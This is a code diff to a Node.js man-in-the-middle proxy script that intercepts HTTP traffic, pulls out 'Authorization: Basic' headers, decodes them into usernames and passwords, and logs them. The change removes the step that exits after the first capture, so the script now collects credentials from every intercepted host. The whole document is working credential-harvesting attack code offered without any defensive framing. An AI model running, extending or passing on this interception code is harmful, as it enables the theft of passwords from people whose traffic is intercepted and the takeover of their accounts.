@@ -1,6 +1,7 @@
 const stream = require('stream')
 const MitmProxy = require('@pureproxy/mitmproxy')
-var credentials = false
+
+var credentials = {}
 
 const server = new class extends MitmProxy {
   wrapClientForObservableStreaming(client, { hostname, port, context }) {
@@ -24,14 +25,9 @@ const server = new class extends MitmProxy {
             if (content.startsWith('Authorization')) {
                 try {
                  
-                    if (credentials) {
-                        process.exit(1);
-                    }
-                    
                     let basicAuth =  Buffer.from(content.replace('Authorization: Basic ', ''), 'base64').toString('utf8').split(':')
                     
-                    credentials = { 
-                        target: client._host || client._parent._host,
+                    credentials[client._host || client._parent._host] = {
                         user: decodeURI(basicAuth[0]), 
                         password: decodeURI(basicAuth[1]) 
                     }
@@ -49,11 +45,13 @@ const server = new class extends MitmProxy {
                         console.log(body);
                     });
         
-                    console.log('I got a credential:', credential)
 
                 } catch (err) {
                     console.error(err)
                 }
+
+                
+                console.log('I got a credential:', credentials)
                 
             }
         })
